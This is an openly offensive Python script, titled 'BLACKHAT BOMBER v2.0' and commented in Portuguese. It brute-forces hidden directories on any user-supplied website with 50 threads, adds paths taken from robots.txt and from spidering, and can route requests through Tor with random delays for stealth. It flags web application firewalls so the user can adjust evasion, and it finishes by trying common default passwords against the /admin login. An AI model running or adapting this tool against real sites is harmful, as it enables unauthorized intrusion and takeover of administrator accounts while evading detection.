import requests
import threading
from queue import Queue
import random
import time
import os
from bs4 import BeautifulSoup

# ========== CONFIGURAÇÕES ==========
NUM_THREADS = 50
TIMEOUT = 5
STEALTH = True
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
CODES_VALIDOS = [200, 204, 301, 302, 401, 403]
TOR_PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

# ========= FILA GLOBAL =========
fila = Queue()
lock = threading.Lock()
caminhos_encontrados = []


# ========== FUNÇÕES UTILITÁRIAS ==========

def carregar_wordlist(caminho):
    try:
        with open(caminho, 'r') as f:
            return [linha.strip() for linha in f if linha.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist '{caminho}' não encontrada.")
        exit(1)

def detectar_waf(resp):
    waf_keywords = ["cloudflare", "sucuri", "waf", "access denied", "blocked", "captcha"]
    headers = " ".join([f"{k}:{v}" for k, v in resp.headers.items()])
    texto = resp.text.lower()
    for k in waf_keywords:
        if k in headers.lower() or k in texto:
            print("[🛡️] WAF detectado! ➜ Ajuste a estratégia de evasão.")
            return True
    return False


# ========== MÓDULO DE ATAQUE DE DIRETÓRIOS ==========

def verificar_diretorio(base_url, path, usar_tor=False):
    headers = {"User-Agent": USER_AGENT}
    proxies = TOR_PROXY if usar_tor else None
    target = f"{base_url.rstrip('/')}/{path}"

    try:
        resp = requests.get(target, headers=headers, timeout=TIMEOUT, allow_redirects=True, proxies=proxies)

        if detectar_waf(resp): return

        if resp.status_code in CODES_VALIDOS:
            with lock:
                print(f"[+] Válido ➜ {target} ({resp.status_code})")
                caminhos_encontrados.append(path)
                with open("log.txt", "a") as log:
                    log.write(f"{target} - {resp.status_code}\n")
        else:
            with lock:
                print(f"[-] Inválido ➜ {target} ({resp.status_code})")
    except Exception as e:
        with lock:
            print(f"[!] Erro ao acessar {target}: {e}")

    if STEALTH:
        time.sleep(random.uniform(0.2, 0.7))


def worker(url, usar_tor):
    while not fila.empty():
        path = fila.get()
        verificar_diretorio(url, path, usar_tor)
        fila.task_done()


def executar_bruteforce(url, caminhos, usar_tor):
    print(f"\n[~] Iniciando brute force com {len(caminhos)} caminhos...")

    for c in caminhos:
        fila.put(c)

    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(url, usar_tor))
        t.daemon = True
        t.start()

    fila.join()


# ========== MÓDULOS INTELIGENTES ==========

def extrair_robots_txt(url):
    print("[~] Buscando robots.txt...")
    try:
        resp = requests.get(f"{url.rstrip('/')}/robots.txt", timeout=3)
        if resp.status_code == 200:
            caminhos = [linha.split(":")[1].strip().strip("/") for linha in resp.text.splitlines() if "Disallow" in linha]
            print(f"[✓] {len(caminhos)} caminhos extraídos de robots.txt")
            return caminhos
    except:
        pass
    return []


def spider_site(url):
    print("[~] Iniciando spidering...")
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            soup = BeautifulSoup(resp.text, 'html.parser')
            links = [a.get('href') for a in soup.find_all('a') if a.get('href')]
            caminhos = [l.strip("/").split("?")[0] for l in links if l.startswith("/")]
            print(f"[✓] Spider extraiu {len(caminhos)} caminhos")
            return list(set(caminhos))
    except:
        pass
    return []


def admin_exploit(url):
    print("[🔥] Tentando acesso ao painel de administração...")
    senhas_comuns = ["admin", "123456", "admin123", "senha", "root"]
    for senha in senhas_comuns:
        dados = {"username": "admin", "password": senha}
        try:
            resp = requests.post(f"{url.rstrip('/')}/admin", data=dados, timeout=3)
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["painel", "logout", "admin"]):
                print(f"[💥] ADMIN PWNED ➜ admin:{senha}")
                return
        except:
            continue
    print("[✖] Bruteforce /admin falhou.")


# ========== EXECUÇÃO PRINCIPAL ==========

def main():
    print("==== 💣 BLACKHAT BOMBER v2.0 ====\n")

    alvo = input("URL alvo (ex: http://site.com): ").strip()
    usar_tor = input("Usar TOR? (s/n): ").strip().lower() == 's'
    usar_robots = input("Usar robots.txt? (s/n): ").strip().lower() == 's'
    usar_spider = input("Fazer spider? (s/n): ").strip().lower() == 's'
    usar_exploit = input("Ativar exploit automático de /admin? (s/n): ").strip().lower() == 's'
    wordlist_path = "common.txt"

    wordlist = carregar_wordlist(wordlist_path)
    extra_robots = extrair_robots_txt(alvo) if usar_robots else []
    extra_spider = spider_site(alvo) if usar_spider else []

    lista_final = list(set(wordlist + extra_robots + extra_spider))

    executar_bruteforce(alvo, lista_final, usar_tor)

    if usar_exploit and 'admin' in caminhos_encontrados:
        admin_exploit(alvo)

    print("\n[✓] Fim da execução.")

